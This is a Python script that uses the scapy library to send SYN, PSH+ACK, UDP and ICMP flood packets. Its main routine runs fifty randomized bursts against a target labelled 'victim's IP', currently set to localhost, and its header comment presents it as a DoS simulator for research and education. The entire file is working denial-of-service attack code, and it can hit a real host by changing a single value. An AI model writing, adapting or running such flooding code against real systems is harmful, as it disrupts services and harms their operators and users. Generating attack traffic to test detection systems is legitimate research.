#!/usr/bin/env python
# coding: utf-8

"""
    @author
          ______         _                  _
         |  ____|       (_)           /\   | |
         | |__ __ _ _ __ _ ___       /  \  | | __ _ ___ _ __ ___   __ _ _ __ _   _
         |  __/ _` | '__| / __|     / /\ \ | |/ _` / __| '_ ` _ \ / _` | '__| | | |
         | | | (_| | |  | \__ \    / ____ \| | (_| \__ \ | | | | | (_| | |  | |_| |
         |_|  \__,_|_|  |_|___/   /_/    \_\_|\__,_|___/_| |_| |_|\__,_|_|   \__, |
                                                                              __/ |
                                                                             |___/
            Email: farisalasmary@gmail.com
            Date:  Dec 26, 2020
"""

# This script is used to simulate different DoS attacks. It's intended to be used
# for research and education purposes. Use it ON YOUR OWN RESPONSIBILITY

from os import system
from sys import stdout
import random
import string
import time
import threading
from scapy.config import conf 
from scapy import route
from scapy.all import *

def random_str(size=None, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    if size == None:
        size = random.randint(1, 1000)
    return ''.join(random.choice(chars) for _ in range(size))


def randomIP():
    return ".".join([str(random.randint(0,255)) for _ in range(4)])    


def flood(dstIP, num_packets, attack_type='syn'):
    start_time = time.time()
    for x in range (0, num_packets):
        dstPort = random.randint(1, 65535)
        s_port = random.randint(1, 65535)
        s_eq = random.randint(0, 4294967295)
        w_indow = random.randint(1, 65535)

        ip_pkt = IP(dst=dstIP)
        
        data = random_str()
        
        crafted_packet = None
        if attack_type == 'syn': # SYN Flood
            flags = "S" # set SYN flag
            tcp_pkt = TCP(sport=s_port, dport=dstPort, flags=flags, seq=s_eq, window = w_indow)
            crafted_packet = ip_pkt / tcp_pkt / Raw(load=data)
        
        elif attack_type == 'psh_ack': # PSH+ACK Flood
            flags = "PA" # set PSH+ACK flags
            tcp_pkt = TCP(sport=s_port, dport=dstPort, flags=flags, seq=s_eq, window = w_indow)
            crafted_packet = ip_pkt / tcp_pkt / Raw(load=data)
        
        elif attack_type == 'udp': # UDP Flood
            udp_pkt = UDP(sport=s_port, dport=dstPort)
            crafted_packet = ip_pkt / udp_pkt / Raw(load=data)
        
        elif attack_type == 'pod':
            crafted_packet = ip_pkt / ICMP() # / Raw(load=data)  # Ping of Death (PoD) Flood
        
        if crafted_packet is not None:
            send(crafted_packet, verbose=0)
        else:
            print('Warning: No packet was created!! make sure you chose one of the available attacks....')
    
    end_time = time.time()
    print(f'Sent {num_packets} in {end_time - start_time} seconds using {attack_type} attack')
###############################################################################################
def main(): 
    dstIP = '127.0.0.1' # victim's IP
    print('Start attacking...')
    attacks = []
    start_time = time.time()
    total_num_packets = 0
    num_attacks = 50
    for i in range(1, num_attacks + 1):
        num_packets = random.randint(1, 10000)
        if len(attacks) == 0:
            attacks = ['syn', 'psh_ack', 'udp', 'pod']
        attack_type = random.choice(attacks)
        attacks.remove(attack_type) # remove from the list to ensure that ALL attacks are executed
        
        print(f'Attack {i} / {num_attacks}')
        print(f'Attack "{attack_type}" was chosen and we plan to send {num_packets} packets!')
        
        flood(dstIP, num_packets, attack_type)
        print('-'*80)
        
        total_num_packets += num_packets
        #x = threading.Thread(target=flood, args=(dstIP, num_packets, attack_type))
        #x.start()
    
    end_time = time.time()
    print(f'Total Sent packets is: {total_num_packets} in {end_time - start_time}')

if __name__ == '__main__':
    main()

